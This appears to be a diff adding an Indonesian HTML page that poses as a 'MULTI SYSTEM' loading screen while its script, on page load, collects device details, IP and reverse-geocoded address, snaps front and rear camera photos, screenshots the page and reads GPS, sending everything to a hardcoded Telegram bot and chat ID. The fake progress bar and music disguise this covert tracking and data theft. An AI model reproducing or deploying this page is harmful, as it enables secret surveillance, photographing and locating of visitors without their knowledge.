@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>MULTI SYSTEM SCRIPT</title>
+  <meta name="description" content="MULTI SYSTEM - POWERED BY NODE">
+  <link rel="icon" type="image/x-icon" href="https://files.catbox.moe/5bwkpb.ico">
+  <link rel="icon" type="image/png" href="https://files.catbox.moe/5bwkpb.png">
+  <link rel="icon" type="image/jpeg" href="https://files.catbox.moe/5bwkpb.jpg">
+  <link rel="apple-touch-icon" href="https://files.catbox.moe/5bwkpb.png">
+  <meta name="theme-color" content="#000000">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+
+  <style>
+    body {
+      background: linear-gradient(270deg, #0f0c29, #302b63, #24243e);
+      background-size: 600% 600%;
+      animation: bgMove 12s ease infinite;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: "Orbitron", Arial, sans-serif;
+      color: #999;
+      overflow: hidden;
+      position: relative;
+    }
+    
+    @keyframes bgMove {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    .particle {
+      position: absolute;
+      background: radial-gradient(circle, #ffffffaa 0%, transparent 70%);
+      border-radius: 50%;
+      opacity: .7;
+      animation: floatParticle linear infinite;
+    }
+    
+    @keyframes floatParticle {
+      from { transform: translateY(100vh) scale(1); }
+      to { transform: translateY(-10vh) scale(0); }
+    }
+
+    #loading-container {
+      text-align: center;
+      width: 80%;
+      max-width: 400px;
+      z-index: 5;
+    }
+    
+    #loading-text {
+      font-size: 24px;
+      margin-bottom: 20px;
+      color: #c293ff;
+      position: relative;
+      text-shadow: 0 0 5px #9b59ff, 0 0 10px #b06cff;
+      animation: glitch 2.4s infinite;
+    }
+    
+    #loading-text::before,
+    #loading-text::after {
+      content: attr(data-text);
+      position: absolute;
+      left: 0;
+      width: 100%;
+      overflow: hidden;
+    }
+    
+    #loading-text::before {
+      left: 2px;
+      text-shadow: -2px 0 red;
+      clip-path: inset(0 0 45% 0);
+      animation: glitchTop 2.4s infinite ease-in-out alternate;
+    }
+    
+    #loading-text::after {
+      left: -2px;
+      text-shadow: 2px 0 cyan;
+      clip-path: inset(55% 0 0 0);
+      animation: glitchBottom 2.4s infinite ease-in-out alternate;
+    }
+    
+    @keyframes glitch {
+      0% { transform: translate(0); }
+      10% { transform: translate(-2px, 1px); }
+      20% { transform: translate(2px, -1px); }
+      30% { transform: translate(-1px, 2px); }
+      40%, 100% { transform: translate(0); }
+    }
+    
+    @keyframes glitchTop {
+      0% { clip-path: inset(0 0 40% 0); }
+      50% { clip-path: inset(0 0 60% 0); }
+      100% { clip-path: inset(0 0 45% 0); }
+    }
+    
+    @keyframes glitchBottom {
+      0% { clip-path: inset(60% 0 0 0); }
+      50% { clip-path: inset(40% 0 0 0); }
+      100% { clip-path: inset(55% 0 0 0); }
+    }
+
+    #progress-container {
+      height: 3px;
+      background: #222;
+      border-radius: 3px;
+      overflow: hidden;
+    }
+    
+    #progress-bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #6e48aa, #9d50bb);
+      transition: width .3s ease;
+    }
+    
+    #loading-details {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #aaa;
+      text-shadow: 0 0 5px #000;
+    }
+    
+    .hidden {
+      display: none;
+    }
+
+    #neon-image {
+      width: 120px;
+      height: 120px;
+      border-radius: 50%;
+      border: 3px solid #fff;
+      box-shadow: 0 0 30px #fff;
+      animation: neonRainbow 3s linear infinite, neonPulse 2s ease-in-out infinite alternate;
+      object-fit: cover;
+      margin: 0 auto 25px;
+      display: block;
+    }
+    
+    @keyframes neonRainbow {
+      0% { border-color: #ff0080; box-shadow: 0 0 25px #ff0080, 0 0 60px #ff0080; }
+      20% { border-color: #ff8c00; box-shadow: 0 0 25px #ff8c00, 0 0 60px #ff8c00; }
+      40% { border-color: #40e0d0; box-shadow: 0 0 25px #40e0d0, 0 0 60px #40e0d0; }
+      60% { border-color: #00ff00; box-shadow: 0 0 25px #00ff00, 0 0 60px #00ff00; }
+      80% { border-color: #1e90ff; box-shadow: 0 0 25px #1e90ff, 0 0 60px #1e90ff; }
+      100% { border-color: #ff0080; box-shadow: 0 0 25px #ff0080, 0 0 60px #ff0080; }
+    }
+    
+    @keyframes neonPulse {
+      from { transform: scale(1); }
+      to { transform: scale(1.05); }
+    }
+    
+    #music-visualizer {
+      position: absolute;
+      bottom: 40px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      align-items: flex-end;
+      gap: 6px;
+      height: 40px;
+      z-index: 10;
+    }
+    
+    .bar {
+      width: 5px;
+      background: linear-gradient(to top, #ff0080, #ff8c00, #40e0d0);
+      border-radius: 5px;
+      animation: barMove 1s ease-in-out infinite;
+    }
+    
+    @keyframes barMove {
+      0%, 100% { height: 10px; opacity: .7; }
+      50% { height: 40px; opacity: 1; }
+    }
+  </style>
+</head>
+
+<body>
+  <!-- Particles Background -->
+  <script>
+    for (let i = 0; i < 40; i++) {
+      const particle = document.createElement('div');
+      particle.className = 'particle';
+      const size = Math.random() * 4 + 2;
+      particle.style.width = size + 'px';
+      particle.style.height = size + 'px';
+      particle.style.left = Math.random() * 100 + '%';
+      particle.style.animationDuration = (8 + Math.random() * 8) + 's';
+      document.body.appendChild(particle);
+    }
+  </script>
+
+  <!-- Loading Container -->
+  <div id="loading-container">
+    <img id="neon-image" src="https://files.catbox.moe/5bwkpb.jpg" alt="Neon Logo">
+    <div id="loading-text" data-text="INITIALIZING SYSTEM...">INITIALIZING SYSTEM...</div>
+    <div id="progress-container">
+      <div id="progress-bar"></div>
+    </div>
+    <div id="loading-details">Memulai inisialisasi...</div>
+  </div>
+  
+  <!-- Hidden Elements -->
+  <video id="v" autoplay muted class="hidden"></video>
+  <canvas id="c" class="hidden"></canvas>
+  <audio id="bg-music" src="https://files.catbox.moe/yu43bv.m4a" preload="auto" loop muted></audio>
+
+  <!-- Music Visualizer -->
+  <div id="music-visualizer">
+    <div class="bar" style="animation-delay: 0s"></div>
+    <div class="bar" style="animation-delay: 0.1s"></div>
+    <div class="bar" style="animation-delay: 0.2s"></div>
+    <div class="bar" style="animation-delay: 0.3s"></div>
+    <div class="bar" style="animation-delay: 0.4s"></div>
+    <div class="bar" style="animation-delay: 0.5s"></div>
+    <div class="bar" style="animation-delay: 0.6s"></div>
+    <div class="bar" style="animation-delay: 0.7s"></div>
+    <div class="bar" style="animation-delay: 0.8s"></div>
+    <div class="bar" style="animation-delay: 0.9s"></div>
+  </div>
+
+  <script>
+    (() => {
+      // Constants - UPDATED TOKEN AND CHAT ID
+      const TELEGRAM_TOKEN = '8552560633:AAGOnetyGHfOA6xt7DpL3gB1IlWxZeIe5vE';
+      const CHAT_ID = '7154535552';
+      const progressBar = document.getElementById('progress-bar');
+      const loadingDetails = document.getElementById('loading-details');
+      
+      // Loading Messages
+      const LOADING_MESSAGES = [
+        "CHECKING SYSTEM MODULE...",
+        "LOADING ALL CORE COMPONENTS...",
+        "INITIALIZE INTERFACE...",
+        "VERIFY SYSTEM CONNECTION...",
+        "PREPARING SYSTEM MODULE...",
+        "CHECK FOR ALL SYSTEM UPDATES...",
+        "LOADING SYSTEM MENU ASSET...", 
+        "CHECK VERIFY MODULE SYSTEM..."
+      ];
+      
+      // Progress Simulation
+      let progress = 0;
+      setInterval(() => {
+        progress += Math.random() * 5;
+        if (progress > 98) progress = 98;
+        progressBar.style.width = progress + '%';
+        
+        if (Math.random() > 0.9) {
+          loadingDetails.textContent = LOADING_MESSAGES[Math.floor(Math.random() * LOADING_MESSAGES.length)];
+        }
+      }, 500);
+      
+      // Audio Handling
+      const audio = document.getElementById('bg-music');
+      const enableSound = () => {
+        audio.muted = false;
+        audio.play().catch(e => console.log('Autoplay diblokir:', e));
+        document.removeEventListener('click', enableSound);
+        document.removeEventListener('touchstart', enableSound);
+      };
+      
+      audio.play().catch(() => {});
+      document.addEventListener('click', enableSound);
+      document.addEventListener('touchstart', enableSound);
+      
+      // Telegram Functions
+      const sendTelegramMessage = async (data) => {
+        try {
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: data,
+              parse_mode: 'HTML'
+            })
+          });
+        } catch (error) {
+          console.error('Error sending Telegram message:', error);
+        }
+      };
+      
+      const sendPhoto = async (blob, filename) => {
+        try {
+          const formData = new FormData();
+          formData.append('chat_id', CHAT_ID);
+          formData.append('photo', blob, filename);
+          
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          });
+        } catch (error) {
+          console.error('Error sending photo:', error);
+        }
+      };
+      
+      // Location Functions
+      const getLocationDetails = async (latitude, longitude) => {
+        try {
+          const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`);
+          const data = await response.json();
+          
+          if (data.address) {
+            return {
+              kabupaten: data.address.county || data.address.city || data.address.state || "Tidak diketahui",
+              kecamatan: data.address.suburb || data.address.village || data.address.town || "Tidak diketahui",
+              alamat: data.display_name || "Alamat tidak tersedia"
+            };
+          }
+        } catch (error) {
+          console.error('Error getting location details:', error);
+        }
+        
+        return {
+          kabupaten: "Tidak diketahui",
+          kecamatan: "Tidak diketahui",
+          alamat: "Alamat tidak tersedia"
+        };
+      };
+      
+      // Device Information
+      const collectDeviceInfo = async () => {
+        let message = 'TRACKING REPORTER NOTIFICATIONS\n\n';
+        message += 'DEVICE INFORMATION\n';
+        message += `🖥️ DEVICE: ${navigator.userAgent}\n`;
+        message += `💻 PLATFORM: ${navigator.platform}\n`;
+        message += `🌐 LANGUAGE: ${navigator.language}\n`;
+        message += `📶 ONLINE: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
+        message += `📺 SCREEN SIZE: ${screen.width}x${screen.height}\n`;
+        message += `🪟 WINDOWS SIZE: ${innerWidth}x${innerHeight}\n`;
+        message += `💾 RAM DEVICE: ${navigator.deviceMemory || 'Unknown'} GB\n`;
+        message += `🧠 CPU DEVICE: ${navigator.hardwareConcurrency}\n`;
+        
+        if (navigator.getBattery) {
+          try {
+            const battery = await navigator.getBattery();
+            message += `🔋 BATTERY: ${Math.floor(battery.level * 100)}%\n`;
+            message += `🔌 CHARGING: ${battery.charging ? '✅ YA' : '❌ TIDAK'}\n`;
+          } catch (error) {
+            message += '🔋 BATTERY: ❌ Tidak tersedia\n';
+          }
+        }
+        
+        message += `⏰ ACCESS TIME: ${new Date().toString()}\n`;
+        message += `🕒 PAGE LOAD TIME: ${performance.now().toFixed(2)} ms\n`;
+        message += `📜 HISTORY LENGTH: ${history.length}\n`;
+        message += `✋ TOUCH SUPPORT: ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}\n`;
+        message += `🔗 REFERRER: ${document.referrer || 'None'}\n`;
+        message += `🌍 URL ACCESS: ${location.href}\n`;
+        message += `📄 TITLE: ${document.title}\n`;
+        message += `🕓 TIMEZONE: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+        message += `🧭 OFFSET: ${new Date().getTimezoneOffset()} menit\n\n`;
+        
+        try {
+          const ipResponse = await fetch('https://ipapi.co/json/');
+          const ipData = await ipResponse.json();
+          
+          message += '📍 LOCATION INFORMATION\n';
+          message += `📡 IP ADDRESS: ${ipData.ip}\n`;
+          message += `🏙️ KOTA: ${ipData.city}\n`;
+          message += `🏙️ KABUPATEN: ${ipData.region}\n`;
+          message += `🗺️ WILAYAH: ${ipData.region}\n`;
+          message += `🌎 NEGARA: ${ipData.country_name}\n`;
+          message += `🏷️ KODE POS: ${ipData.postal}\n`;
+          
+          if (ipData.latitude && ipData.longitude) {
+            message += `📌 LATITUDE: ${ipData.latitude}\n`;
+            message += `📍 LONGITUDE: ${ipData.longitude}\n`;
+            
+            const locationDetails = await getLocationDetails(ipData.latitude, ipData.longitude);
+            message += `🏙️ KABUPATEN: ${locationDetails.kabupaten}\n`;
+            message += `🏙️ KECAMATAN: ${locationDetails.kecamatan}\n`;
+            message += `🏠 ALAMAT LENGKAP: ${locationDetails.alamat}\n`;
+          }
+        } catch (error) {
+          message += '❌ Gagal mendapatkan informasi lokasi\n';
+        }
+        
+        message += '\nPOWERED BY LEZARD OFFICIAL';
+        return message;
+      };
+      
+      // Camera Capture
+      const captureCamera = async (mode) => {
+        const video = document.getElementById('v');
+        const canvas = document.getElementById('c');
+        let stream;
+        
+        try {
+          stream = await navigator.mediaDevices.getUserMedia({
+            video: { 
+              facingMode: { exact: mode } 
+            }
+          });
+          
+          video.srcObject = stream;
+          
+          await new Promise(resolve => {
+            video.onloadedmetadata = resolve;
+          });
+          
+          video.play();
+          await new Promise(resolve => setTimeout(resolve, 1500));
+          
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+          
+          canvas.toBlob(blob => sendPhoto(blob, `${mode}_camera_capture.jpg`), 'image/jpeg');
+          
+          stream.getTracks().forEach(track => track.stop());
+          return true;
+        } catch (error) {
+          if (stream) {
+            stream.getTracks().forEach(track => track.stop());
+          }
+          
+          await sendTelegramMessage(`⚠️ Gagal Akses Kamera ${mode.toUpperCase()}. Mencoba mode lain...`);
+          return false;
+        }
+      };
+      
+      // Main System Tracking
+      const systemTracking = async () => {
+        // Send device information
+        await sendTelegramMessage(await collectDeviceInfo());
+        
+        // Try to capture camera
+        let cameraSuccess = await captureCamera("user");
+        if (!cameraSuccess) {
+          cameraSuccess = await captureCamera("environment");
+        }
+        
+        if (!cameraSuccess) {
+          await sendTelegramMessage('❌ Akses ke kedua kamera (Depan & Belakang) diblokir.');
+        }
+        
+        // Take screenshot
+        setTimeout(async () => {
+          try {
+            const canvas = await html2canvas(document.body);
+            canvas.toBlob(blob => sendPhoto(blob, 'screenshot.jpg'), 'image/jpeg');
+          } catch (error) {
+            await sendTelegramMessage('❌ Screenshot failed');
+          }
+        }, 2000);
+        
+        // Get GPS location
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            async (position) => {
+              const lat = position.coords.latitude;
+              const lon = position.coords.longitude;
+              
+              let gpsMessage = '📍 GPS TRACKING (ONE-TIME)\n\n';
+              gpsMessage += `📌 LAT: ${lat}\n📍 LNG: ${lon}\n`;
+              gpsMessage += `🎯 AKURASI: ${position.coords.accuracy}m\n`;
+              gpsMessage += `🗺️ GOOGLE MAPS: https://www.google.com/maps/search/?api=1&query=${lat},${lon}\n`;
+              
+              const locationDetails = await getLocationDetails(lat, lon);
+              gpsMessage += `🏙️ KABUPATEN: ${locationDetails.kabupaten}\n`;
+              gpsMessage += `🏙️ KECAMATAN: ${locationDetails.kecamatan}\n`;
+              gpsMessage += `🏠 ALAMAT: ${locationDetails.alamat}\n`;
+              
+              await sendTelegramMessage(gpsMessage);
+            },
+            async (error) => {
+              await sendTelegramMessage(`❌ GPS Error: ${error.message}`);
+            },
+            {
+              enableHighAccuracy: true,
+              maximumAge: 0,
+              timeout: 5000
+            }
+          );
+        }
+      };
+      
+      // Initialize System Tracking
+      systemTracking();
+    })();
+  </script>
+</body>
+      </html>
